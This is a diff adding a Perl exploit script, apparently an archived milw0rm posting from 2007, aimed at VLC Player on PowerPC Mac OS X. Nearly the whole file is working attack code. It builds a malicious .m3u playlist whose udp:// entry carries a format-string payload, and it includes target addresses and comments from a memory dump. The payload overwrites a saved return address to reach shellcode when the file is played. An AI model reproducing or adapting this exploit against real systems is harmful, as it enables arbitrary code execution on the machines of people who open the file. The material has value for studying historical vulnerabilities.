@@ -1,0 +1,41 @@
+#!/usr/bin/perl
+#
+# http://www.digitalmunition.com/VLCMediaSlayer-ppc.pl
+# Code by Kevin Finisterre kf_lists[at]digitalmunition[dot]com
+#
+# This is just a vanilla format string exploit for OSX on ppc. We overwrite a saved return addy with our shellcode address.
+# This code currently overwrites the saved return addy with the stack location of our shellcode.
+#
+# This exploit will create a malicious .m3u file that will cause VLC Player for OSX to execute arbitrary code.
+#
+
+# 0xf02031d2:      "--? 0j? 0h%11$hn.%12$hn", 'X' <repeats 177 times>...
+# 0xf020329a:      'X' <repeats 200 times>...
+# 0xf0203362:      'X' <repeats 200 times>...
+# 0xf020342a:      'X' <repeats 200 times>...
+# 0xf02034f2:      'X' <repeats 194 times>, "ZY"
+# 0xf02035b7:      ""
+# 0xf02035b8:      'X' <repeats 16 times>, "? 5?\005\017G?? 60"
+# 0xf02035d5:      ""
+# 0xf02035d6:      ""
+# 0xf02035d7:      "\004\005\016
+
+$format =
+# make it more robust yourself... I'm lazy
+# land in 0xf020 3362 - middle of shellcode
+# "%2511%24hn.%2512%24hn" .
+#
+"%25" . (0x3362-0x24) . "d" . "%25" . "11" . "%24" . "hn" .
+"%25" . 0xBCBE . "d" . "%25" . "12" . "%24" . "hn" ;
+
+# 0xf020 3068 saved ret for MsgQueue()
+$writeaddr = 0xf0203068;
+
+open(PWNED,">pwnage.m3u");
+
+print PWNED "#EXTM3U\n" ."udp://--" . pack('l', $writeaddr+2) . pack('l', $writeaddr) .
+$format ."i" x (999 - length("Can't get file status for ") ) ."\n";
+
+close(PWNED);
+
+# milw0rm.com [2007-01-02]
